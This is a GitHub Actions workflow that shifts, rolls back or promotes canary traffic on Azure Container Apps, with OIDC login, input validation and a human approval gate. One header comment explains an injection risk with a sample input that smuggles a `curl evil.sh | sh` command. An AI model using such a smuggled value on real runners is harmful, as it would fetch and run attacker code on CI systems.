name: Canary Traffic

run-name: Canary Traffic -> ${{ inputs.action }} ${{ inputs.percent }}%

# Deliberately manual. If traffic shifted automatically right after deploy this
# would be a slow full deploy, not a canary -- the decision point is the feature.
#
# Note on style: workflow expressions are never interpolated into `run:` script
# text. They are bound to environment variables and referenced as shell
# variables, because an expression pasted into a script is executed as code --
# a `percent` of `1)); curl evil.sh | sh; ((0` would run on the runner.
on:
  workflow_dispatch:
    inputs:
      action:
        description: 'What to do with traffic'
        type: choice
        required: true
        default: shift
        options:
          - shift      # send `percent` to the canary, the rest to stable
          - rollback   # stable back to 100%, canary to 0%
          - promote    # canary to 100% and deactivate the old stable
      percent:
        description: 'Percent of traffic for the canary (shift only, 1-99)'
        type: string
        required: false
        default: '10'

permissions:
  id-token: write
  contents: read

env:
  AZURE_CLIENT_ID: ${{ vars.AZURE_CLIENT_ID }}
  AZURE_TENANT_ID: ${{ vars.AZURE_TENANT_ID }}
  AZURE_SUBSCRIPTION_ID: ${{ vars.AZURE_SUBSCRIPTION_ID }}
  AZURE_RESOURCE_GROUP: ${{ vars.AZURE_RESOURCE_GROUP }}
  APP_NAME: ${{ vars.APP_NAME }}

jobs:
  traffic:
    name: Shift traffic
    runs-on: ubuntu-latest
    # A GitHub Environment with a required reviewer, so a human approves before
    # real users are exposed. Environment names are case-sensitive.
    environment: production
    steps:
      - name: Validate percent
        if: inputs.action == 'shift'
        env:
          PERCENT: ${{ inputs.percent }}
        run: |
          case "$PERCENT" in
            ''|*[!0-9]*) echo "percent must be a whole number" >&2; exit 1 ;;
          esac

          if [ "$PERCENT" -lt 1 ] || [ "$PERCENT" -gt 99 ]; then
            echo "percent must be between 1 and 99. Use 'promote' for 100 or 'rollback' for 0." >&2
            exit 1
          fi

      - name: Log in to Azure using OIDC
        uses: azure/login@7184910d9eb2b1c5e48f7073824a90609bb9b6d6 # v2.3.1
        with:
          client-id: ${{ env.AZURE_CLIENT_ID }}
          tenant-id: ${{ env.AZURE_TENANT_ID }}
          subscription-id: ${{ env.AZURE_SUBSCRIPTION_ID }}

      # The canary is whichever revision carries the 'canary' label (set by CD).
      # Stable is whichever other active revision currently holds the most traffic.
      - name: Identify revisions
        id: revisions
        run: |
          CANARY=$(az containerapp revision list \
              --name "$APP_NAME" --resource-group "$AZURE_RESOURCE_GROUP" \
              --query "[?properties.active && contains(properties.labels || [], 'canary')].name | [0]" -o tsv)

          if [ -z "$CANARY" ]; then
            echo "No revision carries the 'canary' label. Run CD first." >&2
            exit 1
          fi

          STABLE=$(az containerapp ingress traffic show \
              --name "$APP_NAME" --resource-group "$AZURE_RESOURCE_GROUP" \
              --query "sort_by([?revisionName != null && revisionName != '$CANARY'], &weight) | [-1].revisionName" -o tsv)

          if [ -z "$STABLE" ] || [ "$STABLE" = "$CANARY" ]; then
            echo "Could not identify a distinct stable revision -- the canary may already hold all traffic." >&2
            exit 1
          fi

          echo "canary=$CANARY" >> "$GITHUB_OUTPUT"
          echo "stable=$STABLE" >> "$GITHUB_OUTPUT"
          echo "Canary: $CANARY"
          echo "Stable: $STABLE"

      - name: Shift traffic to the canary
        if: inputs.action == 'shift'
        env:
          PERCENT: ${{ inputs.percent }}
          CANARY: ${{ steps.revisions.outputs.canary }}
          STABLE: ${{ steps.revisions.outputs.stable }}
        run: |
          REMAINDER=$((100 - PERCENT))
          az containerapp ingress traffic set \
              --name "$APP_NAME" --resource-group "$AZURE_RESOURCE_GROUP" \
              --revision-weight "$CANARY=$PERCENT" "$STABLE=$REMAINDER"

      # Seconds, and no rebuild -- the payoff of splitting deploy from release.
      - name: Roll back to stable
        if: inputs.action == 'rollback'
        env:
          CANARY: ${{ steps.revisions.outputs.canary }}
          STABLE: ${{ steps.revisions.outputs.stable }}
        run: |
          az containerapp ingress traffic set \
              --name "$APP_NAME" --resource-group "$AZURE_RESOURCE_GROUP" \
              --revision-weight "$STABLE=100" "$CANARY=0"

      - name: Promote the canary
        if: inputs.action == 'promote'
        env:
          CANARY: ${{ steps.revisions.outputs.canary }}
          STABLE: ${{ steps.revisions.outputs.stable }}
        run: |
          az containerapp ingress traffic set \
              --name "$APP_NAME" --resource-group "$AZURE_RESOURCE_GROUP" \
              --revision-weight "$CANARY=100"

          # Deactivated rather than deleted: reactivating is far faster than
          # rebuilding if something surfaces after promotion.
          az containerapp revision deactivate \
              --name "$APP_NAME" --resource-group "$AZURE_RESOURCE_GROUP" \
              --revision "$STABLE"

      - name: Report resulting split
        env:
          ACTION: ${{ inputs.action }}
        run: |
          {
            echo "### Traffic after \`$ACTION\`"
            echo ""
            echo '```'
            az containerapp ingress traffic show \
                --name "$APP_NAME" --resource-group "$AZURE_RESOURCE_GROUP" -o table
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"
